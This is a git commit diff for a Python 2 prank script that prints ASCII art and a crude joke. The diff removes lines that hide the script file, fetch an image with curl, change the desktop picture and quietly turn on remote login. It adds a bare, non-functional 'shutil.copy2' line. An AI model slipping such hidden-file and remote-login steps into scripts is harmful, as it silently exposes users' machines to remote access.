f0e6498df5ceae2e73139b5cb263098762b80976
ldeclan21 <ldeclan21@aischennai.org>
2016-11-09 14:04:56 +0530

    Update hap.py

--- hap.py
+++ hap.py
@@ -2,7 +2,7 @@
 #Must be using Python 2.x (not 3.x)
 import os
 import time
-
+import shutil
 print "                         nooo$$$$$$$$$$$$ooo"
 time.sleep(0.02)
 print "                      oo$$$$$$$$$$$$$$$$$$$$$$o"
@@ -56,7 +56,4 @@ time.sleep(0.02)
 print "                                      '$$'''"
 time.sleep(0.05)
 print "(Dicks out for Harambe.)"
-os.system('chflags hidden hap.py')
-os.system('curl -k https://s18.postimg.org/epobnzbs9/vinay_potato.png')
-os.system('osascript -e 'tell application "Finder" to set desktop picture to POSIX file "~/Downloads/vinay_potato.png"'')
-os.system('systemsetup -setremotelogin on')
+shutil.copy2
